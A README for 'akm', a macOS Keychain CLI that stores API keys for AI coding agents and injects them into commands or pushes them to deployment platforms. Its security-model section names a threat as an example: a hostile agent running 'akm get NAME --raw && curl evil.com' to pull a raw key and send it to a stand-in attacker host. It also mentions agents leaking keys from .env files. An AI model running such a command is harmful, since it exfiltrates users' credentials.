# akm

> Agent-driven macOS Keychain CLI for API keys. Zero human friction.

`akm` stores API keys in the macOS Login Keychain so AI coding agents (Claude Code, Cursor, Codex) can use them on your behalf without ever putting plaintext values into `.env` files, shell history, or your conversation transcript.

## Install

```bash
brew install paperfoot/tap/akm
# or
cargo install --git https://github.com/paperfoot/api-key-manager
```

## Use

```bash
# Store a key (from stdin — preferred, never lands in shell history)
echo "sk-..." | akm add OPENAI_API_KEY

# Run a command with keys injected as env vars
akm run --only OPENAI_API_KEY -- python script.py

# Push directly to deployment platforms — no copy-paste from a dashboard
akm push vercel OPENAI_API_KEY --env production
akm push gh OPENAI_API_KEY --repo me/myproj
akm push fly OPENAI_API_KEY --app my-app

# Show stored keys (names only, never values)
akm list --json
```

## Why

Every coding agent today has shell access to your project. The default `.env` file is now a security liability — agents read it, paste it into transcripts, and commit it. `akm` keeps keys in the Keychain and injects them into child processes via `execve`, so plaintext never touches disk, `ps`, or your shell context.

## Commands

| Command | What it does |
|---|---|
| `akm add NAME` | Store a key (stdin or argv). |
| `akm get NAME` | Retrieve, masked by default. `--raw` for the unmasked value. |
| `akm run --only NAME -- <cmd>` | Run `<cmd>` with the named keys injected as env vars. Child stdout/stderr is redacted by default. |
| `akm push vercel\|gh\|fly NAME ...` | Upload to a deployment platform. |
| `akm list` | Print stored key names. |
| `akm rm NAME` | Delete a key. |
| `akm audit` | Print the append-only access log. |
| `akm guard install` | Install a git pre-commit hook that scans staged files for known key prefixes. |
| `akm skill install` | Drop the Claude Code / Codex / Gemini skill so agents reach for `akm` automatically. |
| `akm agent-info --json` | Machine-readable capability manifest. |

## Security model (honest)

**Protects against:** plaintext `.env` files on disk, keys in shell history, keys in `ps` output, keys committed to git by an overzealous agent, keys re-appearing in agent conversation context, build-tool printouts (via output redaction).

**Does not protect against:** malware running as your user, a hostile agent that runs `akm get NAME --raw && curl evil.com`. Those threats need a different tool. The audit log records every access for post-hoc review.

## License

MIT.
